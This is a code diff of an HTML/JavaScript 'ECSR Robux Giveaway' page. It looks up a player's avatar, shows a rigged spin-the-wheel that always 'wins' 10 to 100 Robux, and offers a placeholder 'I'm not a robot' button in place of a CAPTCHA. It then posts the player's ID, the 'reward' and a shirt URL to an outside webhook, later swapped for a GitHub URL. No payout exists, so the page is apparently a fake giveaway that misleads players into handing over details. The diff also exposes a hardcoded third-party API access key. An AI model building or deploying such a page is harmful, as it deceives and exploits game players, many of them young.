@@ -4,38 +4,66 @@
   <meta charset="UTF-8">
   <title>ECSR Robux Giveaway</title>
   <style>
-    body { font-family: Arial; text-align: center; padding: 20px; }
-    #avatar, #profileImg, #wheel, #reward, #shirtSection, #captchaSection { display: none; margin-top: 20px; }
-    #spinBtn { padding: 10px 20px; font-size: 16px; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f5f5f5;
+      text-align: center;
+      padding: 40px;
+    }
+    h1 {
+      color: #333;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      font-size: 16px;
+    }
+    button {
+      cursor: pointer;
+    }
+    .section {
+      margin-top: 30px;
+      display: none;
+    }
+    #avatar img, #profileImg img {
+      border-radius: 10px;
+      margin-top: 10px;
+    }
+    .hidden {
+      display: none;
+    }
   </style>
 </head>
 <body>
+
   <h1>ECSR Robux Giveaway</h1>
+
   <input type="text" id="userId" placeholder="Enter ECSR User ID">
   <button onclick="verifyUser()">Check</button>
 
-  <div id="avatar"></div>
-  <div id="profileImg"></div>
-  <div id="confirm">
+  <div class="section" id="avatar"></div>
+  <div class="section" id="profileImg"></div>
+
+  <div class="section" id="confirm">
     <p>Is this you?</p>
     <button onclick="proceed()">Yes</button>
     <button onclick="reset()">No</button>
   </div>
 
-  <div id="wheel">
+  <div class="section" id="wheel">
     <p>Spin the wheel!</p>
-    <button id="spinBtn" onclick="spinWheel()">🎡 SPIN</button>
+    <button onclick="spinWheel()">🎡 SPIN</button>
   </div>
 
-  <div id="reward"></div>
+  <div class="section" id="reward"></div>
 
-  <div id="captchaSection">
-    <p>Complete the CAPTCHA below:</p>
-    <!-- Replace with actual Turnstile or FunCaptcha -->
+  <div class="section" id="captchaSection">
+    <p>Complete CAPTCHA to continue:</p>
+    <!-- Replace with real CAPTCHA widget -->
     <button onclick="captchaPassed()">✅ I'm not a robot</button>
   </div>
 
-  <div id="shirtSection">
+  <div class="section" id="shirtSection">
     <p>Enter your shirt URL to claim your Robux:</p>
     <input type="text" id="shirtUrl" placeholder="https://ecsr.io/shirt/...">
     <button onclick="submitClaim()">Submit</button>
@@ -46,28 +74,36 @@
     let rewardAmount = 0;
 
     function verifyUser() {
-      userId = document.getElementById('userId').value;
-      if (!userId) return alert("Enter a valid user ID");
+      userId = document.getElementById('userId').value.trim();
+      if (!userId) return alert("Please enter a valid user ID.");
 
       const avatarUrl = `https://ecsr.io/apisite/thumbnails/v1/users/avatar-headshot?userIds=${userId}`;
+
       fetch(avatarUrl)
         .then(res => res.json())
         .then(data => {
-          const imageUrl = "https://ecsr.io" + data.data[0].imageUrl;
-          document.getElementById('avatar').innerHTML = `<img src="${imageUrl}" width="100">`;
+          const imagePath = data.data[0]?.imageUrl;
+          if (!imagePath) throw new Error("Invalid response");
+
+          const avatarImg = "https://ecsr.io" + imagePath;
+          const profileImg = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`;
+
+          document.getElementById('avatar').innerHTML = `<img src="${avatarImg}" width="120">`;
+          document.getElementById('profileImg').innerHTML = `<img src="${profileImg}" width="300">`;
+
           document.getElementById('avatar').style.display = 'block';
-
-          const profileUrl = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`;
-          document.getElementById('profileImg').innerHTML = `<img src="${profileUrl}" width="300">`;
           document.getElementById('profileImg').style.display = 'block';
-
           document.getElementById('confirm').style.display = 'block';
+        })
+        .catch(err => {
+          alert("User not found or API error.");
+          console.error(err);
         });
     }
 
     function proceed() {
-      document.getElementById('wheel').style.display = 'block';
       document.getElementById('confirm').style.display = 'none';
+      document.getElementById('wheel').style.display = 'block';
     }
 
     function reset() {
@@ -75,8 +111,8 @@
     }
 
     function spinWheel() {
-      rewardAmount = Math.floor(Math.random() * 10) * 10 + 10;
-      document.getElementById('reward').innerText = `🎉 You won ${rewardAmount} Robux!`;
+      rewardAmount = (Math.floor(Math.random() * 10) + 1) * 10; // 10 - 100
+      document.getElementById('reward').innerHTML = `🎉 You won ${rewardAmount} Robux!`;
       document.getElementById('reward').style.display = 'block';
       document.getElementById('captchaSection').style.display = 'block';
     }
@@ -87,10 +123,10 @@
     }
 
     function submitClaim() {
-      const shirtUrl = document.getElementById('shirtUrl').value;
-      if (!shirtUrl.startsWith("http")) return alert("Enter a valid shirt URL");
+      const shirtUrl = document.getElementById('shirtUrl').value.trim();
+      if (!shirtUrl.startsWith("http")) return alert("Enter a valid shirt URL.");
 
-      fetch('http://just-testingg.infinityfreeapp.com/webhook.php', {
+      fetch('https://github.com/Wumpu7/aa/tree/main', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -98,11 +134,17 @@
           reward: rewardAmount,
           shirtUrl: shirtUrl
         })
-      }).then(() => {
-        alert("Claim submitted! We will verify and pay soon.");
+      })
+      .then(res => res.json())
+      .then(() => {
+        alert("Your claim has been submitted! We’ll review and pay out shortly.");
         window.location.reload();
+      })
+      .catch(() => {
+        alert("Error sending claim.");
       });
     }
   </script>
+
 </body>
 </html>
